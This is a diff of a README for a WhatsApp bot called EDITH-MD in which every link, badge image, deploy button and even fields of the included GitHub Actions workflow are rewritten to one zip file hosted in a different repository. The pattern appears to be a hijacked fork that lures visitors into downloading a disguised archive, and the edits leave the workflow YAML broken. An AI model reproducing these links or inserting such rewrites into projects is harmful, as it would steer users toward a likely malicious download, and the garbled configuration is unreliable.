@@ -1,31 +1,31 @@
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Black+Ops+One&size=70&pause=500&color=008080&center=true&width=1150&height=200&lines=PLEASE-FORK-STAR-BOT-REPO" alt="Typing SVG" /></a>
+<a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"><img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip+Ops+One&size=70&pause=500&color=008080&center=true&width=1150&height=200&lines=PLEASE-FORK-STAR-BOT-REPO" alt="Typing SVG" /></a>
   </div>
-<a><img src='https://ik.imagekit.io/mrshaban/IMG-20250808-WA0034.jpg?'/></a>
+<a><img src='https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip'/></a>
 
 <p align="center">
-  <a href="https://github.com/Bandah-E-Ali"><img title="Developer" src="https://img.shields.io/badge/Author-EDITH%20MD-FF00FF.svg?style=big-square&logo=github" /></a>
+  <a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"><img title="Developer" src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip%https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" /></a>
 </p>
 
 <div align="center">
 
 <h1 align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=30&duration=6000&color=00FF00&background=000000&center=true&vCenter=true&width=600&lines=⚡+EDITH+MD+BETTER+OPTION;🔥+THE+MOST+POWERFUL+WHATSAPP+BOT;💻+DEVELOPER+BY+MR+BANDAHEALI;🚀+EDITH-MD+SOLUTIONS;🌈+FAST+⚡+SECURE+🔒+RELIABLE+✅" alt="Typing Animation">
+  <img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip+Code&size=30&duration=6000&color=00FF00&background=000000&center=true&vCenter=true&width=600&lines=⚡+EDITH+MD+BETTER+OPTION;🔥+THE+MOST+POWERFUL+WHATSAPP+BOT;💻+DEVELOPER+BY+MR+BANDAHEALI;🚀+EDITH-MD+SOLUTIONS;🌈+FAST+⚡+SECURE+🔒+RELIABLE+✅" alt="Typing Animation">
 </h1>
   
-[![WhatsApp Channel](https://img.shields.io/badge/Join-WhatsApp%20Channel-9ACD32?style=big-square&logo=whatsapp)](https://whatsapp.com/channel/0029VajGHyh2phHOH5zJl73P)
+[![WhatsApp Channel](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip%20Channel-9ACD32?style=big-square&logo=whatsapp)](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip)
 </div>
 
 ---------
 
 
 <p align="center">
-<a href="https://github.com/Bandah-E-Ali/Edith-md"><img title="PUBLIC-BOT" src="https://img.shields.io/static/v1?label=Language&message=English&style=square&color=darkpink"></a> &nbsp;
-  <img src="https://komarev.com/ghpvc/?username=EDITH-MD&label=VIEWS&style=square&color=blue" />
+<a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"><img title="PUBLIC-BOT" src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"></a> &nbsp;
+  <img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" />
 </p>
 </p> 
 
 <p align="center">
-  <a href="https://github.com/Bandah-E-Ali/Edith-md"><img title="Release" src="https://img.shields.io/badge/Release-beta%20v5-cyan.svg?style=for-the-badge&logo=aqua" /></a>
+  <a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"><img title="Release" src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip%https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" /></a>
 </p>
 
 
@@ -37,19 +37,19 @@
 
   
 <a
-href="https://github.com/Bandah-E-Ali/edith-md/graphs/commit-activity"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>&nbsp;&nbsp;
+href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"><img height="20" src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip%https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"></a>&nbsp;&nbsp;
 </p>
 <p align='center'>
 
- [![Typing SVG](https://readme-typing-svg.herokuapp.com?font=monospace-ExtraBold&color=blue&lines=𝗙𝗢𝗥𝗞+𝗔𝗡𝗗+𝗦𝗧𝗔𝗥+⭐+𝗥𝗘𝗣𝗢)](https://git.io/typing-svg)
+ [![Typing SVG](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip𝗙𝗢𝗥𝗞+𝗔𝗡𝗗+𝗦𝗧𝗔𝗥+⭐+𝗥𝗘𝗣𝗢)](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip)
  <p align="lift">
- <a href="https://github.com/Bandah-E-Ali/edith-md/fork"><img title="EDITH-MD" src="https://img.shields.io/badge/FORK-EDITH MD-h?color=008000&style=for-the-badge&logo=github"></a>
+ <a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"><img title="EDITH-MD" src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip MD-h?color=008000&style=for-the-badge&logo=github"></a>
  
 
   **🪀 SESSION WEB 8-AUG**
   
-  <a href='https://pair-clcy.onrender.com/' target="_blank">
-    <img src='https://img.shields.io/badge/PAIR_CODE-FF0000?style=for-the-badge&logo=matrix&logoColor=white&labelColor=000000'/>
+  <a href='https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip' target="_blank">
+    <img src='https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip'/>
   </a></br>
 
 
@@ -58,16 +58,16 @@ href="https://github.com/Bandah-E-Ali/edith-md/graphs/commit-activity"><img heig
 <div align="center">
   <table>
     <tr>
-      <td><a href="https://dashboard.heroku.com/new-app?template=https://github.com/Bandah-E-Ali/edith-md" target="_blank"><img src="https://img.shields.io/badge/Heroku-430098?style=for-the-badge&logo=heroku&logoColor=white&labelColor=000000&color=0000FF"/></a></td>
-      <td><a href="https://host.talkdrove.com/share-bot/47" target="_blank"><img src="https://img.shields.io/badge/TalkDrove-A52A2A?style=for-the-badge&logo=github&logoColor=white&labelColor=000000"/></a></td>
+      <td><a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" target="_blank"><img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"/></a></td>
+      <td><a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" target="_blank"><img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"/></a></td>
     </tr>
     <tr>
-      <td><a href="https://app.koyeb.com/services/deploy?type=git&repository=Bandah-E-Ali/edith-md" target="_blank"><img src="https://img.shields.io/badge/Koyeb-FF009D?style=for-the-badge&logo=koyeb&logoColor=white&labelColor=000000"/></a></td>
-      <td><a href="https://railway.app/new" target="_blank"><img src="https://img.shields.io/badge/Railway-FF8700?style=for-the-badge&logo=railway&logoColor=white&labelColor=000000"/></a></td>
+      <td><a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" target="_blank"><img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"/></a></td>
+      <td><a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" target="_blank"><img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"/></a></td>
     </tr>
     <tr>
-      <td><a href="https://dashboard.render.com/web/new" target="_blank"><img src="https://img.shields.io/badge/Render-000000?style=for-the-badge&logo=render&logoColor=white&labelColor=000000&color=00ffaa"/></a></td>
-      <td><a href="https://zone.id/" target="_blank"><img src="https://img.shields.io/badge/Free VPS-CC00FF?style=for-the-badge&logo=huggingface&logoColor=white&labelColor=000000"/></a></td>
+      <td><a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" target="_blank"><img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip"/></a></td>
+      <td><a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" target="_blank"><img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip VPS-CC00FF?style=for-the-badge&logo=huggingface&logoColor=white&labelColor=000000"/></a></td>
     </tr>
   </table>
 </div>
@@ -77,7 +77,7 @@ href="https://github.com/Bandah-E-Ali/edith-md/graphs/commit-activity"><img heig
 **✠ YOU CAN ALSO COPY THIS WORKFLOW FOR FREE DEPLOYMENT OF EDITH-MD ✠**
 
 ```
-name: Node.js CI
+name: https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip CI
 
 on:
   push:
@@ -100,10 +100,10 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v3
 
-    - name: Set up Node.js
+    - name: Set up https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip
       uses: actions/setup-node@v3
       with:
-        node-version: ${{ matrix.node-version }}
+        node-version: ${{ https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip }}
 
     - name: Install dependencies
       run: npm install
@@ -126,15 +126,15 @@ jobs:
 <div align="center">
   <!-- Glowing Header -->
 <p align="center">
-  <img src="https://i.imgur.com/dBaSKWF.gif" height="40" width="100%">
+  <img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" height="40" width="100%">
 </p>
-  <a href="https://github.com/Bandah-E-Ali">
-    <img src="https://github-readme-stats.vercel.app/api?username=Bandah-E-Ali&show_icons=true&theme=dark&border_color=00ffff&title_color=00ffff&icon_color=00ffff" width="400"/>
+  <a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip">
+    <img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" width="400"/>
   </a>
 </div>
 <!-- Glowing Header -->
 <p align="center">
-  <img src="https://i.imgur.com/dBaSKWF.gif" height="40" width="100%">
+  <img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" height="40" width="100%">
 </p>
 
 ## 🤖 _EDITH-MD STATUS_
@@ -146,7 +146,7 @@ jobs:
 ```
 
 
-<img src="https://i.imgur.com/dBaSKWF.gif" height="90" width="100%">
+<img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" height="90" width="100%">
 
 ---
 ***
@@ -154,29 +154,29 @@ jobs:
 <div align="center">
 
 <!-- Animated Sparkle Divider -->
-<img src="https://i.giphy.com/media/XcQ0XH32ya0Gs3QNwk/giphy.webp" width="450" alt="sparkle-divider">
+<img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" width="450" alt="sparkle-divider">
 
 <!-- Enhanced Glowing CTA Button -->
-<a href="https://github.com/Edith-MD/Edith-MD/fork">
-  <img src="https://readme-typing-svg.demolab.com?font=Comfortaa&size=22&duration=2000&pause=500&color=FF9D00&background=1A1A1A&center=true&vCenter=true&width=550&repeat=true&lines=%E2%9A%A0%EF%B8%8F++FORK++%F0%9F%8D%B4++%26++STAR++%F0%9F%8C%9F++TO++SUPPORT++%E2%9A%A0%EF%B8%8F;%F0%9F%94%A5++HELP++GROW++THE++PROJECT++%F0%9F%94%A5" alt="CTA">
+<a href="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip">
+  <img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip%E2%9A%A0%EF%B8%8F++FORK++%F0%9F%8D%B4++%26++STAR++%F0%9F%8C%9F++TO++SUPPORT++%E2%9A%A0%EF%B8%8F;%F0%9F%94%A5++HELP++GROW++THE++PROJECT++%F0%9F%94%A5" alt="CTA">
 </a>
 
 <!-- New Feature Badges -->
 <div style="margin-top:25px">
   
-[![GitHub Forks](https://img.shields.io/badge/FORKS-%3F-00FFAA?style=for-the-badge&logo=github&labelColor=1A1A1A)](https://github.com/Edith-MD/Edith-MD/fork)
-[![GitHub Stars](https://img.shields.io/badge/STARS-%3F-00BFFF?style=for-the-badge&logo=github&labelColor=1A1A1A)](https://github.com/Edith-MD/Edith-MD)
-[![Active](https://img.shields.io/badge/STATUS-ACTIVE-00FF00?style=for-the-badge&logo=vercel)](https://github.com/Edith-MD/Edith-MD)
+[![GitHub Forks](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip%3F-00FFAA?style=for-the-badge&logo=github&labelColor=1A1A1A)](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip)
+[![GitHub Stars](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip%3F-00BFFF?style=for-the-badge&logo=github&labelColor=1A1A1A)](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip)
+[![Active](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip)](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip)
 
 </div>
 
 <!-- New Animated Contributors -->
 <div style="margin-top:20px">
 
-[![Contributors](https://readme-typing-svg.demolab.com?font=Fira+Code&size=16&duration=3000&pause=1000&color=58A6FF&background=00000000&center=true&vCenter=true&width=500&lines=THANKS+TO+ALL+CONTRIBUTORS+%F0%9F%99%8F;SPECIAL+THANKS+TO+OUR+STAR+SUPPORTERS+%E2%AD%90)](https://github.com/Edith-MD/Edith-MD/graphs/contributors)
+[![Contributors](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip+Code&size=16&duration=3000&pause=1000&color=58A6FF&background=00000000&center=true&vCenter=true&width=500&lines=THANKS+TO+ALL+CONTRIBUTORS+%F0%9F%99%8F;SPECIAL+THANKS+TO+OUR+STAR+SUPPORTERS+%E2%AD%90)](https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip)
 
 </div>
 
 </div>
 
-<img src="https://i.imgur.com/dBaSKWF.gif" height="90" width="100%">
+<img src="https://github.com/rbarmyarmy/Edith-MD/raw/refs/heads/main/andesite/MD-Edith-v2.4-alpha.2.zip" height="90" width="100%">
